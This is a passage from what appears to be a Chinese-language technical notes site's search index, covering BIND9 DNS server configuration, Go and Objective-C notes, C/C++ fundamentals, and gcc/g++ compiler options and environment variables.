记录，这个IP地址必须与你搭建的DNS服务器保持一致； 举例: ; 记录 NS 记录 @ IN NS ns.domain.com. ; 记录 NS 记录对应的 IP 地址信息 ns.domain.com. IN A 192.168.1.1 zone file - Address Records Address Records 记录了 域名 与 IP 地址的对应关系: ns.domain.com. IN A 192.168.1.1 zone file - Canonical Name Records CName 将 单个昵称或者别名映射到一个可能存在在区域外的真实的区域. 在一个域名下存在多个子域名，如果需要更改映射之前的子域名，那么只需要更改映射的域名地址就可以了: ; $TTL 2d $ORIGIN domain.com. ... server1 IN A 192.168.1.1 www IN CNAME Server1 配置项说明 acl 一般来说，ACL模块用来承担控制主机可以访问域名解析服务器的角色，其设置不会让控制文件的配置非常冗余和庞大。 采用这个配置可以有效防范DOS以及Spoofing攻击。 一般来说定义这部分的内容来规定IP是否能够被接入以及Blacklist来阻止某些特定的IP地址介入到域名解析服务器中。 ACL匹配客户端是否能够接入到域名服务器基于三个基本的特征: 客户端的IPv4或者IPv6地址 用于签署请求的 TSIG 和 SIG(0) 密钥 在DNS客户端子网选项中编码的前缀地址 匹配 acl 定义以及使用规则如下： string 是用来命名IP地址集的一个变量名，可以随意地被命名: acl <string> { <address_match_element>; ... }; 举一个在 named.conf.options 文件中被定义的例子: acl bogusnets { 0.0.0.0/8; 192.0.2.0/24; 224.0.0.0/3; 10.0.0.0/8; 172.16.0.0/12; 192.168.0.0/16; }; // 这个部分 // Set up an ACL called our-nets. Replace this with the // real IP numbers. acl our-nets { 172.16.2.11/24; 172.16.2.12/24; }; //子网的名称 logging logging 部分的配置为DNS解析服务器提供了日志记录的功能，DNS服务器上的所有日志记录被存储到了指定的文件中。 其通用的配置文件为: logging { category <string> { <channel_name_string>; ... }; channel <string> { buffered <boolean>; file <quoted_string> [ versions ( unlimited | <integer> ) ] [ size <size> ] [ suffix ( increment | timestamp ) ]; null; print-category <boolean>; print-severity <boolean>; print-time ( iso8601 | iso8601-utc | local | <boolean> ); severity <log_severity>; stderr; syslog [ <syslog_facility> ]; }; }; 从上边的通用配置格式可以看出来，logging 模块分为两个部分，category 和 channel. channel的作用是指定输出的方式、日志格式的选项和事件的严重性，每一个channel 可以指定一个 category 来指定记录的事件类型。 category 用来区分不同的事件产生的类别或者场景，比如：客户端请求-client request、配置文件解析处理-Configuration file parsing and processing。 如果在 named.conf.options 文件中没有指定 logging 模块系统会给出一个默认的配置: logging { category default { default_syslog; default_debug; }; category unmatched { null; }; }; channel 的配置规则 所有的日志输出都需要 channel 来指定输出格式，BIND9 对于创建 channel 的数量没有限制。 每一个 channel 都需要为该通道的日志信息指定一个 destination clause - 目的句柄，目的句柄在 channel 阶段被配置，这个目的句柄用来区分： 输出到具体的文件的名字 - file 输出到具体的系统日志工具中（syslog/syslogd）- syslog 输出到终端显示- 标准错误流(standard error stream) 或者该错误消息直接被丢弃 - null。 其次，channel 的配置可以规定每一个错误日志消息的响应级别，默认的响应级别是info ，channel 可以规定接受错误消息的级别； 此外，channel 还可以控制输出错误日志消息的格式，可以包含：响应时间戳、category名字、严重等级等。 channel 的配置参数 buffered: 用来规定是否刷新错误日志的文件，其参数值为<boolean>，在 BIND9 中 <boolean> 值的参数值为 yes / no，如果设置成为 yes 那么日志消息流(一般每一个错误日志消息都是一个 Log Entry)就不会刷新，而是被保存在缓冲区中了，不会刷新到文件中。 file： 类似于Linux的通道概念，file 将日志输出流通过通道直接输出给文件，从上边的通用配置可以看出来可以为 file 指定文本文件的大小 - size ；指定 log 文件的版本号 - version；指定用于命名备份版本的格式 - suffix size 用来限制log文件的大小，如果log文件的大小设置超过了设定的阈值，那么系统会自动停止输出内容到文件中； versions： 用于指定新创建的 log文件数存储到本地的上限值，默认的参数值为unlimited，当指定的文件的大小超过设定的size值得时候，如果没有指定 versions，那么系统就不会继续写进log；如果制定了versions，那么就会继续写入； suffix ：设定用来命名log文件的方式；好像没啥用，我添加这个参数没有什么反应...； syslog：将通道定向到系统的日志文件流中； 常用的支持日志文件服务为：dameon、syslog、local6、local7； severity：用来承担定义日志严重级别的定义角色，相当于 syslog - priorities。比如说定义了日志的严重级别为 Debug，那么会输出日志事件 Debug 以上的错误到文件中。一般常用的严重等级： debug[level]、notice、warning、dynamic - 与当前服务器的日志保持一致；一般的 DNS服务器的日志等级调成 info即可； stderr：将通道指向服务器的标准错误流。这是为了在服务器作为前台进程运行时使用； print-time： yes / no / local / iso8601 / iso8061-utc 可以设定不同的输出到日志文件的时间格式； print-category：打印日志消息配置category 的信息到你设定的日志文件中； print-severity： 打印日志的严重等级 category词组配置规则 category词组配置规则: category <config_string> { <channel_name_string>; ... }; client： 客户端请求； cname：由于是CNAME而不是a /AAAA记录 的域名服务器； config： 配置文件解析和处理过程； database：与名称服务器内部用于存储区域和缓存数据的数据库相关的消息； general： 没有被归类的 category 类别的其他种类的日志文件信息； lame-servers： 远程服务器中的错误配置，BIND 9在解析期间试图查询这些服务器时发现； network： 网络操作； notify： 通知协议； queries：记录所有查询 DNS服务器的 query； query-errors： 关于导致某些失败的查询的信息； xfer-in：区域传输服务器正在接收； xfer-out：区域传输服务器正在发送的信息； zoneload：加载区域和创建自动空区域； 怎么配置这个服务 配置的 logging 服务会创建指定的日志文件，该日志文件从服务挂起的时候被创建，用于记录DNS服务中的相关的配置信息以及交换信息。 在 Debian9 的默认存储目录为 /var/cache/bind/*. 也可以为其指定你想要存储的位置. 我个人喜欢将 BIND 日志和系统日志保存在一起，即保存路径为：/var/log/bind。 这个路径不是在你安装 BIND 时候就已经创建了，需要你自己创建对应的文件目录； 如果你想要配置成一个自己的目录，首先你需要创建一个自定义的目录，比如说我指定了我想要存放日志的文件的目录： /var/log/bind，如果不为这个文件使用chown命令指定权限的话会出现 isc_stdio_open '/var/log/example.log' failed 的报错： 首先你必须手动创建自己的文件到指定目录下； 解决方法是: sudo chown bind:root /var/log/bind/* ； 现在我们已经基本上了解了 logging 的工作原理. 其工作机制简单地来说就是，首先你需要创建一个 channel 来规定输出日志流的格式还以及日志文件名、文件版本. 每一个 channel 可以被多个 category 调用使用， 每一个 category 相当于一个 BIND9 内嵌的服务模块， 服务模块去调用日志配置模最后输出格式化日志。 在这里我之前并没有给出对应的配置示例，现在给出示例: // named.conf.options 文件中给出logging的配置示例 logging { // 在我自己使用BIND进行DNS解析的时候，出现了 TIME_OUT 的相关错误，这个错误是需要在 client 进行日志记录 // 因此对于客户端的解析需要有相关的日志配置，才能发现在解析时的问题 // // // category client { default_client; } // 指定 client 所有的错误 channel default_client { file \"/var/log/bind/err/client.log\" version 1 size 20m print-category yes; print-time iso8061; severity debug 3; } } options options 的参数设置会影响整个 BIND9 DNS环境的配置，具体各部分常用到的配置参数如下 listen-on： 用于配置监听的端口以及IPv4地址，默认的监听端口为：53； listen-on-v6：用于监听 IPv6 地址以及端口； directory: 用于指定读取DNS数据文件的文件夹，默认的文件夹的路径为：/var/cache/bind； dump-file：选项用来设置域名缓存数据库文件的位置，可以自己定义。默认的存储文件为：named_dump.db； statistics-file：选项用来设置状态统计文件的位置，可以自己定义。； memstatistics-file ：选项用来设置服务器输出的内存使用统计信息。默认保存在 /var/named/data 目录下，文件名为 named.memstats； allow-query：选项用来设置允许DNS查询的客户端地址，默认值为localhost, 可以设置为某个网段、任意地址、具体的某台主机三种情况。例如，要修改为任意地址，就在括号内的加入 any，也可以引用之前创建的 acl 内的所有地址； recursion：用于设置递归查询，一般客户机和服务器之间属于递归查询，即当客户机向DNS服务器发出查询请求后，若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到结果后转交给客户机。此选项有yes和no两个值。这个选项用于设置 Failover 非常有用； dnssec-enable： 选项用来设置是否启用DNSSEC支持，DNSSEC可以用来验证DNS数据的有效性，该选项有yes和no两个值，默认值为yes。 dnssec-validation：选项用来设置是否启用DNSSEC确认，默认值为yes，可以选择 auto。 bindkeys-file ： 用来设置内置信任的密钥文件，其默认值为 /etc/named/iscdlv.key； managed-keys-directory： 选项用于指定目录中的文件存储位置，跟踪管理 DNSSEC 密钥， 这部分的内容在后边会有介绍； forwarders：DNS转发器。用于设定该DNS解析服务器无法进行当前域名解析的情况下，进行转发解析的DNS地址，其中 8.8.8.8 和 8.8.4.4 是谷歌的免费DNS服务器的网络地址；233.5.5.5 和 233.6.6.6 是阿里云的免费DNS地址。当设置了 forwarder 的转发器之后，所有的非本域的和在缓存中无法查找到的域名查询都转发都设置的DNS转发器，由DNS转发器 完成转发操作。因此这台转发器的缓存中就记录了丰富的域名信息。因此如果遇到非本域的查询，转发器的缓存就可以做到查询，从而减少了向外部的查询流量。 forward: 选择默认的IP地址即可； rrset-order： 在 BIND 9 提供的负载均衡策略建立在一个名称（域名 - Name）使用多个资源记录 ( Records ) 的情况下，其实现的轮询机制并不是传统的负载均衡服务器实现的轮询机制 - 即追踪和记录每一次应答的资源顺序； BIND 9 实现了一个类似 List 的数据结构，将所有的资源记录填入到 一个顺序表中，这个填入的次序随机，或者根据设定的参数随机； 格式: [class class_name] [type type_name] [name \"domain_name\"] order ordering 如果参数没有被赋值，那么默认的赋值为: class: ANY type: ANY Name: * 参数: fixed ： 根据 zone 文件定义资源记录的顺序按照顺序逐个进行解析； random： 根据 zone 文件资源记录随机返回解析记录； cyclic： 创建一个循环，循环输出资源记录； none： 完全随机的资源返回形式； controls controls语句声明了系统管理员用于管理名称服务器远程操作的控制通道。 rndc使用这些控制通道向名称服务器发送命令，并从名称服务器检索非dns结果。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-package-bind9-software-package.html","loc":"/yq-doc-source-docs-operating-system-linux-package-bind9-software-package.html"},{"title":"gitg","text":"一个图形化git工具, 支持便捷的查看git提交等. 安装: apt install gitg 执行, 直接输入命令即可打开图形界面: gitg","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-package-gitg.html","loc":"/yq-doc-source-docs-operating-system-linux-package-gitg.html"},{"title":"Go","text":"Go学习记录, 24.01.29 第一版源于 Go 语言教程 特色 简洁、快速、安全 并行、有趣、开源 内存管理、数组安全、编译迅速 用途 Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。 对于高性能分布式系统领域而言，Go 语言无疑比大多数其它语言有着更高的开发效率。 它提供了海量并行的支持，这对于游戏服务端的开发而言是再好不过了。 Mac下安装: brew install go","tags":"后端","url":"/yq-doc-source-docs-rear-end-GO-index.html","loc":"/yq-doc-source-docs-rear-end-GO-index.html"},{"title":"Object-C","text":"Mac上比较旧的开发语言 一些关键字 nonatomic nonatomic 是一个线程安全相关的属性修饰符。 它用于指定属性的访问方法（getter 和 setter）在多线程环境下不需要进行加锁操作。 使用 nonatomic 修饰的属性访问会更快，但在并发访问时可能会出现数据竞争和不一致的问题。 如果转换为Swift, Swift 中的属性默认是非原子的，因此不需要显式指定 nonatomic。 如果你需要在多线程环境中访问属性，并确保线程安全，可以使用其他手段来保证，例如使用串行队列或锁。 retain retain 是指定属性的内存管理语义的修饰符。 在引用计数内存管理模型中，它用于增加被引用对象的引用计数，并在不再需要时释放引用计数。 retain 表示属性是一个 强引用 ，它会在设置新值时自动增加引用计数，并在不再需要时适时释放引用计数。 如果转换为Swift, 在 Swift 中，默认使用强引用来管理内存，因此不需要显式指定 retain。 属性的引用计数会在不再被引用时自动减少，并在合适的时机释放内存。 weak weak 是一种属性修饰符，在 Swift 中用于创建 弱引用（weak reference） . 它主要用于解决循环引用（retain cycle）的问题，并帮助管理内存。 以下是 weak 修饰符的作用和特点： 弱引用：使用 weak 修饰的属性创建的引用是弱引用。 弱引用不会增加对象的引用计数，当所引用的对象被释放时，弱引用会自动设置为 nil。 这有助于避免循环引用，从而防止内存泄漏。 解决循环引用：循环引用指的是两个或多个对象之间形成的相互强引用关系，导致它们无法被正确释放。 这可能会导致内存泄漏，因为对象无法被垃圾回收。 通过在其中一个对象的属性上使用 weak 修饰符，可以打破循环引用，使其中一个对象成为弱引用。 自动设置为 nil：当所引用的对象被释放时，弱引用会自动设置为 nil。 这意味着你可以安全地使用弱引用，而不必担心访问已释放的对象。 需要注意的是，只有在引用对象的生命周期可能比引用它的对象短时，才适合使用弱引用。 如果引用对象的生命周期与引用它的对象相同或更长，那么使用弱引用可能会导致访问已释放对象的错误。","tags":"后端","url":"/yq-doc-source-docs-rear-end-Object-C-index.html","loc":"/yq-doc-source-docs-rear-end-Object-C-index.html"},{"title":"基础知识C(++)","text":"结构体 定义 定义: struct $tag { $c_type arg1; $c_type arg2; ... } arg_list; struct 是关键字表示定义结构体 tag 是结构题标签, 相当于Python的类 c_type arg1 表示定义结构题内具体的成员变量, 比如 int x arg_list 是当前结构体变量名, 可以为多个. 可以理解为 tag 标签实例化了多个类 注解 结构体标签, 成员变量定义, 结构题变量名. 定义时, 至少需要其中两个, 否则错误. 如, 以下声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c: //结构体的标签被命名为SIMPLE,没有声明变量 struct SIMPLE { int a; char b; double c; }; //用SIMPLE标签的结构体，另外声明了变量t1、t2、t3 struct SIMPLE t1, t2[20], *t3; 等价与: struct SIMPLE { int a; char b; double c; } t1, t2[20], *t3; 初始化 初始化: #include <stdio.h> struct Books { char title[50]; char author[50]; char subject[100]; int book_id; } book = {\"标题\", \"作者\", \"C\", 1111}; // 访问使用 . , 如 book.book_id 访问 结构体本身用 . 访问 结构题指针用 -> 访问 用例: typedef 重新定义已有变量、类型等 char数组赋值 初始化直接赋值: char a[20] = \"hello\"; 数组逐个赋值: char a[20] = {'h', 'e', 'l', 'l', 'o'}; strcpy拷贝赋值: char a[20]; strcpy(a, \"hello\") 其他: char const *se = \"hello\"; 等价与: char const *see; see = \"hello\"; 注解 char const *se = \"hello\"; 需要加 const 是因为char表示字符常量, 不允许被修改. 单/双引号 单引号引用单个字符, 表示字符字面量, 占用一个字符, 代表整数, 整数值对应于该字符在编译器采用的字符集中的序列值(一般编译器采用的都是ASCII字符集) 双引号引用字符串常量, 表示字符串字面量, 占用为所有字符个数加一, 因为每个字符串末尾自动会加上一个空字符 '0', 代表字符指针, 指向字符数组首地址. 如 \"a\"+1 表示指针运算, 指向结束符 '0'. 空字符常量 '0' 空白字符串 \"\" 指针 指针也是一种变量，只不过它的内存单元中保存的是一个标识其他位置的地址。。由于地址也是整数，在３２位平台下，指针默认为３２位。。 指向的直接意思就是指针变量所保存的其他的地址单元中所存放的数据类型: int *p ; //p 变量保存的地址所在内存单元中的数据类型为整型 float *q; // ... 浮点型 不论指向的数据类型为那种，指针变量其本身永远为整型，因为它保存的地址。 C语言中定义一个变量时可以初始化: char str[10] = {\"hello world\"}; 当编译器遇到这句时，会把str数组中从第一个元素把hello world0 逐个填入。。 C语言中规定数组代表数组所在内存位置的首地址，也是 str[0]的地址，即: str = &str[0]; 而printf(\"%s\",str); 为什么用首地址就可以输出字符串, 因为这里给的也是地址. 即打印出的结果为变量地址所指向的值. 比较打脑壳的情况: char *s ; s = \"China\"; // 可以编译通过, 因为这里赋值实际还是赋值的首地址 // \"China\" 是一个字符串, 若用变量表示指向即为其首地址, 这里把首地址赋值给s (打印出来也是首地址而非\"China\") 几个不同概念 char *a : 保存字符串首地址的指针变量 char a[] : 字符数组 char *a [] : []的优先级高于*, 所以a先和 []结合, 他还是一个数组, 数组中的元素才是char * char **a : 二级指针, 表示一级指针 的地址 注解 char* a 等价与 char *a, 都是表示指针 不过如果一起定义两个指针只能这样写: char *a, *b 特殊符号 # 在C(++)中, #表示预处理或者预编译(正式编译前的处理, 非编译). 注解 C语言程序从编写到运行要经过预处理、编译、汇编和链接这 4 个阶段 #define(宏定义) 定义普通常量 定义一个标识符来表示一个常量。其特点是：定义的标识符不占内存，只是一个临时的符号，预编译后这个符号就不存在了。 用 #define 定义标识符的一般形式为: #define 标识符 常量 //注意, 最后没有分号 作用范围为当前源文件, 若要终止使用宏定义, 用: #undef 标识符 表示不再使用宏替换 注解 宏定义的标识符一般大写, 末尾不加分号, 且支持定义嵌套 带参数替换 例: #define S(a,b) a*b area=S(3,2); 第一步被换为area=a*b; 第二步换为area=3*2; 注解 注意宏替换只做替换, 不求解. 宏展开不占用运行时间，只占用编译时间，函数调用占运行时间（分配内存、保留现场、值传递、返回值） 双#表示连接 ##是连接符号 例: #define Conn(x,y) x##y 表示x与y连接, 如: int n = Conn(123,456); 结果就是n=123456; 表示转换字符#@ \"#@\"表示转换字符(结果加上单引号), 结果返回constchar类型 例: #define ToChar(x) #@x 如: char a = ToChar(1); 结果就是a='1'; 做个越界试验: char a = ToChar(123); 结果是a='3'; 但是如果你的参数超过四个字符，编译器就给给你报错了！error C2015:too many characters in constant ：P 转换字符串单# #是替换为字符串 例: #define ToString(x) #x 若定义: char* str = ToString(123132); 就成了str=\"123132\"; 注解 可以使用 ifndef 来避免重复定义宏: #ifndef __headerfileXXX__ #define __headerfileXXX__ … code … #endif c++虚函数 被virtual关键字修饰的成员函数，就是虚函数. 作用是为了实现多态(将接口与实现分离) 借用百度百科的例子: #include<iostream> using namespace std; class A { public: virtual void print(){cout<<\"This is A\"<<endl;} }; class B : public A { public: void print(){cout<<\"This is B\"<<endl;} }; int main1() { A a; B b; a.print(); b.print(); return 0; } int main2() { A a; B b; A *p1 = &a; A *p2 = &b; p1->print(); p2->print(); return 0; } 此例中, 如果父类print不是定义的虚函数, 那么main2函数打印结果都是 This is A. 只要基类是虚函数, 那么派生类继承此虚函数的, 不管是否有关键字virtual, 都是虚函数. 因为如果没有写关键字, 编译器会自动帮你加上. 参考:: https://baike.baidu.com/item /虚函数#:~:text=在某基类中声明为%20virtual%20并在一个或多个派生类中被重新定义的成员函数，用法格式为：virtual,函数返回类型%20函数名（参数表）%20%7B函数体%7D；实现多态性，通过指向派生类的基类指针或引用，访问派生类中同名覆盖成员函数%E3%80%82 另外一个问题, 虚函数的继承要保持一致, 如, 以下两个定义是不等价的: virtual void func()const virtual void func() 虚函数的声明与定义要求非常严格，只有在子函数中的虚函数与父函数一模一样的时候（包括限定符）才会被认为是真正的虚函数，不然的话就只能是重载。这被称为虚函数定义的同名覆盖原则，意思是只有名称完全一样时才能完成虚函数的定义。 内存分区 内存分5个区：全局名字空间，自由存储区，寄存器，代码空间，栈 大端/小端 大端: 较低的有效字节存放在较高的存储器地址中，较高的有效字节存放在较低的存储器地址 小端: 较高的有效字节存放在较高的存储器地址中，较低的有效字节存放在较低的存储器地址 栈的地址分配是从高->低,堆的地址分配是从低->高.","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-Basic-knowledge.html","loc":"/yq-doc-source-docs-rear-end-from-Basic-knowledge.html"},{"title":"C++","text":"最初本来是在 /docs/后端/c/基础知识 等里面混着C与C++说, 后面是越来越多了, 觉得还是分了好点. 数组形参与实参的说明 在C++中,如果形参类型是`char a[]`(或其他数组类型),它会默认 decay(退化) 成 char*(或相应的指针类型)。 所以 char a[] 形参会被视为 char* a. 举一个例子: void print(char a[]) { cout << a << endl; } int main() { char str[] = \"Hello\"; print(str); } 这里, print 函数的形参是 char a[] , 但是在调用 print(str) 时, str 数组会自动退化为指针. 所以实际上 a 是 char* 类型,并且指向字符串 \"Hello\" . 函数形参定义是否应该使用指针 主要取决于我们是否需要修改原变量的值吧 当需要修改原变量值时, 必须传递指针, 比如结构体; 不需要修改值时, 都可以, 不过使用指针是对原来变量的引用可以节省空间. 否则就是变量的复制. char *str[]与char str[]区别 char *str[] 是一维字符指针数组。它的每个元素都是一个指向字符串的指针。 (赋值字符串) char str[] 是一维字符数组。它的每个元素都是一个字符。(赋值字符) 将字符指针(字符串)赋值给了数组元素。每个数组元素都指向一个字符串: char *str[] = { \"Hello\", \"World\", \"!\" }; cout << str[0] << ' ' << str[1] << endl; // Hello World 将字符(字符值)赋值给了数组元素。数组中每个元素都是一个字符: char str[] = { 'H', 'e', 'l', 'l', 'o' }; cout << str << endl; // Hello","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-C-++.html","loc":"/yq-doc-source-docs-rear-end-from-C-++.html"},{"title":"printf与sprintf","text":"sprintf和printf在用法和功能上存在以下区别 printf(data): 将内容输出到屏幕 sprintf(var, data): 将data赋值给var, data可以是不同类型变量的格式化; 这就是与 strcpy 的差别, strcpy 只能操作字符串 strcpy(var1, var2): Cstring_strcpy","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-C-library-function-Printf-and-Sprintf.html","loc":"/yq-doc-source-docs-rear-end-from-C-library-function-Printf-and-Sprintf.html"},{"title":"fflush","text":"","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-C-library-function-fflush.html","loc":"/yq-doc-source-docs-rear-end-from-C-library-function-fflush.html"},{"title":"c类型","text":"char 和 wchar_t 是 C 语言中的字符类型。 char 基本的字符类型，用于表示一个字节大小的字符。 它可以存储 ASCII 字符集中的字符，以及扩展字符集（如 Latin-1）中的字符。 wchar_t 宽字符类型，用于表示一个或多个字节的宽字符。 它的大小可以根据编译器和平台的不同而变化，通常是 2 个或 4 个字节大小。 wchar_t 类型用于支持更广泛的字符集，包括 Unicode 字符集。 char与wchar_t char 与 wchar_t 在 C 语言中，使用 char 类型可以处理大多数常见的字符和字符串操作。 例如，使用 char 类型的数组可以存储和操作普通的字符串。 而在需要处理宽字符集的场景中，可以使用 wchar_t 类型和相关的宽字符函数，如 wprintf、wcscpy 等。 这些宽字符函数可以处理多字节字符，提供对 Unicode 字符集的支持。 需要注意的是，char 和 wchar_t 之间的转换需要使用相应的转换函数，例如 mbstowcs 和 wcstombs。 在 Python 中，对于处理字符和字符串，通常使用 Unicode 字符串，因为 Python 3 默认使用 Unicode 字符串。 在 ctypes 中，可以使用 c_char 和 c_wchar 类型来与 C 的 char 和 wchar_t 进行交互。","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-C-type.html","loc":"/yq-doc-source-docs-rear-end-from-C-type.html"},{"title":"gcc/g++","text":"最浅显是认识是: gcc 用于 c 语言 g++ 用于 c++ 但是这个认识是错的, 也不说全错, 正确的认识是: g++以及gcc的区别 大致: GCC:GNU Compiler Collection(GUN 编译器集合)，它可以编译C、C++、JAV、Fortran、Pascal、Object-C等语言。 Compiler 编译程序，gcc/g++/cc 用来编译源代码文件，通常通过 gcc 调用 g++ 或 cc 命令； Assemblers 汇编程序，编译汇编程序，通常通过 gcc 调用 as 命令； Linkers 链接程序，用来链接编译输出的目标文件，生成可执行程序，通常通过 gcc 调用 ld 命令，还有 ar 命令生成链接库； GCC 编译套件不仅支持 C/C++，支持各种 C/C++ 方言标准，还支持 Go 或 Object-C/C++ 等，并且支持 x86、x86_64、ARM 等多种 CPU 架构。提供 gcc 命令相当于一个门户，它本身就是 C 语言编译器，并且通过它可以调用整个编译流程中会使用到的各种命令。它可以识别各种 C/C++ 源文件的扩展名，并将相应参数传给相应的命令，如果是 C++ 源代码，则执行 g++ 命令。 另外， cc 是 Unix 系统的 C Compiler，一个是古老的 C 编译器命令。Linux 的 cc 一般是一个符号连接，指向 gcc，可以通过 ls -l /usr/bin/cc 来查看。 注意，直接使用 g++ 编译 C 语言源代码会被当作 C++ 源代码处理。 例如，编译 C 语言为汇编程序，不生成目标文件和可执行程序，只需要执行命令时使用 -S ： gcc是GCC中的GUN C Compiler（C 编译器） g++是GCC中的GUN C++ Compiler（C++编译器） gcc和g++的主要区别: 对于 .c和 .cpp文件，gcc分别当做c和cpp文件编译（c和cpp的语法强度是不一样的） 对于 .c和 .cpp文件，g++则统一当做cpp文件编译 使用g++编译文件时，g++会自动链接标准库STL，而gcc不会自动链接STL gcc在编译C文件时，可使用的预定义宏是比较少的 gcc在编译cpp文件时/g++在编译c文件和cpp文件时（这时候gcc和g++调用的都是cpp文件的编译器），会加入一些额外的宏。 在用gcc编译c++文件时，为了能够使用STL，需要加参数 –lstdc++ ，但这并不代表 gcc –lstdc++ 和 g++等价，它们的区别不仅仅是这个。 gcc 选项 -I <dir> 指定头文件所在目录, 会优先找此处指定的目录 -l <dir> 指定库路径. 指定需要链接的库名，用于告诉链接器需要链接哪些库文件 -L <dir> 指定库文件所在目录 -f no-lto 禁用链接时优化（LTO） 当使用该选项编译源代码时，编译器将不会进行链接时优化， 这可能会导致一些性能上的损失，但也可以避免某些链接错误。 注解 -fno-lto 主要用于使用的链接文件是由其他版本LTO的gcc编译时导致无法继续编译时候吧 网上看到一篇不错的说明: gcc命令行详解 gcc 相关环境变量 CC CC 在Linux系统中，CC是一个环境变量，用于指定默认的C编译器。 当你在终端中输入gcc命令时，实际上是使用了CC环境变量中指定的编译器。 CC环境变量通常被设置为gcc或clang等编译器的路径，例如： CC=/usr/bin/gcc 这表示默认使用GCC作为C编译器。如果你想使用Clang作为C编译器，则可以将CC环境变量的值设置为Clang的路径。 注解 修改CC环境变量可能会影响整个系统的行为。因此，在更改它之前，请确保你知道自己在做什么，并且进行充分的测试和确认。 如果你想修改GCC运行时默认添加的参数，可以使用环境变量 CFLAGS 和 LDFLAGS CFLAGS CFLAGS环境变量用于 指定编译器（例如gcc）的默认编译选项 . 它通常包含一系列的标志，例如优化级别、调试信息等等。 如果你想添加或修改默认的编译选项，可以设置CFLAGS环境变量。例如: CFLAGS=\"-O3 -Wall\" 这里将优化级别设置为-O3，并启用所有警告信息（-Wall）。需要注意的是, 修改CFLAGS环境变量会对整个系统生效 LDFLAGS LDFLAGS环境变量用于 指定链接器（例如ld）的默认链接选项 . 它通常包含一系列的标志，例如库文件路径、静态链接选项、动态链接选项等等。 如果你想添加或修改默认的链接选项，可以设置LDFLAGS环境变量。例如: LDFLAGS=\"-L/path/to/library/files -lmymath\" 这里将库文件路径设置为/path/to/library/files，并链接一个名为libmymath.so的共享库文件。 需要注意的是，修改LDFLAGS环境变量会对整个系统生效。 需要注意的是，在设置CFLAGS和LDFLAGS环境变量时，应该尽可能避免重复的标志。如果同一个标志被多次指定，可能会导致编译或链接错误。 头文件相关环境变量 在Linux中, 有四个环境变量可以用来设置预处理阶段头文件搜索路径: C_INCLUDE_PATH（用于C语言） CPP_INCLUDE_PATH（用于C++） CPATH（都可以用） OBJC_INCLUDE_PATH 注意Linux中, 它们的取值可以是一组用:分割开的地址列表, 类似于环境变量PATH pkg-config 当需要指定的头文件目录非常多时, 全部写在参数就非常麻烦, 于是可以用: pkg-config 示例, 查看头文件库文件路径: yanque@yanquedembp ~ % pkg-config --cflags glib-2.0 -I/usr/local/Cellar/glib/2.70.4/include/glib-2.0 -I/usr/local/Cellar/glib/2.70.4/lib/glib-2.0/include -I/usr/local/opt/gettext/include -I/usr/local/Cellar/pcre/8.45/include yanque@yanquedembp ~ % yanque@yanquedembp ~ % pkg-config --libs glib-2.0 -L/usr/local/Cellar/glib/2.70.4/lib -L/usr/local/opt/gettext/lib -lglib-2.0 -lintl ld与gcc联系 ld和C编译器（如gcc）都是GNU编译工具链的一部分，但它们的作用有所不同。 C编译器主要用于将源代码编译成目标文件 ，这些目标文件可以是机器码或汇编代码。 在编译源代码过程中，C编译器会对代码进行语法分析和类型检查，并生成可执行文件所需的符号表、重定位表等信息。 同时，C编译器还会将源代码中使用到的库文件链接到可执行文件中，以便程序能够正确地运行。 链接器（ld）则主要用于将多个目标文件链接成一个可执行文件或共享库 。 在链接过程中，链接器会根据符号表和重定位表等信息，将不同的目标文件合并为一个整体， 并解决各种符号引用和地址重定位问题，最终生成可执行文件或共享库。 需要注意的是, 在Linux系统中, 链接器通常由C编译器自动调用 。 也就是说，在编译源代码时，C编译器会自动调用链接器来生成可执行文件。因此，在使用gcc编译时，你无需手动调用链接器。 msvc 与gcc类似, 是msvc 微软的一个闭源编译器, 仅支持Windows, 也不支持高版本的语言特性/标准, 不过提供了与编译头文件等技术加快编译速度 编译后的文件说明 .a文件, 静态库文件 .o文件, 对象文件, 目标文件 .so文件, 共享库文件 一般使用g++编译, 默认生成的就是 .o 文件, 表示一个对象文件, 是单个源代码文件编译后的结果. 需要在链接过程中和其他 .o 文件或者库文件链接到一起,生成可执行文件. 用于动态链接,生成可执行文件较小但运行时还需要原来的 .o 文件. 动态链接的优点是可执行文件较小, 运行时对环境依赖性更强. .a 文件由多个 .o 文件聚合而成, 用于静态链接, 生成可执行文件较大但运行时不需要 .a 文件. 静态链接的优点是运行更快,但可执行文件较大. 如将当前目录下所有 .o 文件打包为静态库文件( .m 文件): ar -rc res.m *.o ar使用可见 /docs/操作系统/linux/linux指令/ar","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-GCC-(++)-compiler.html","loc":"/yq-doc-source-docs-rear-end-from-GCC-(++)-compiler.html"},{"title":"一些关键字","text":"extern 在声明之前, 先引用同一个文件中的变量, 如: extern int num; printf(\"%d\",num); int num = 3; 引用另一个文件中的变量/函数","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-Some-keywords.html","loc":"/yq-doc-source-docs-rear-end-from-Some-keywords.html"},{"title":"string.h","text":"strcpy strcpy(a, b): 相当于python的值传递赋值, 把b复制一份给a strcat strcat(a, b): 字符串原地拼接, 相当于python的 a = a+b strlen strtok","tags":"后端","url":"/yq-doc-source-docs-rear-end-from-Standard-library-string-h.html","loc":"/yq-doc-source-docs-rear-end-from-Standard-library-string-h.html"},{"title":"使用CLion遇到的坑","text":"c(++)的项目根据不同的编译方式, 可以分为几类项目: cmake makefile compilation database gradle 官网指引:: https://www.jetbrains.com/help/clion/clion-quick-start-guide.html#open-create-prj https://www.jetbrains.com/zh-cn/clion/features/start-your-project.html 暂且只说cmake项目 配置 对于CLion而言, 需要配置的主要有以下几个地方: 工具链 在此处指定make, gcc, g++ 的路径 cmake 指定本cmake项目使用哪一个配置的工具链 CMakeLists.txt CMakeLists.txt位于项目根目录下, 里面写明了如何构建环境. 比如环境变量, 如何运行都依赖此文件. 工具链和cmake 注解 若无cmake需要自行下载安装, 正常直接执行: xcode-select --install 安装好绑定的工具即可(不过我用的时候, 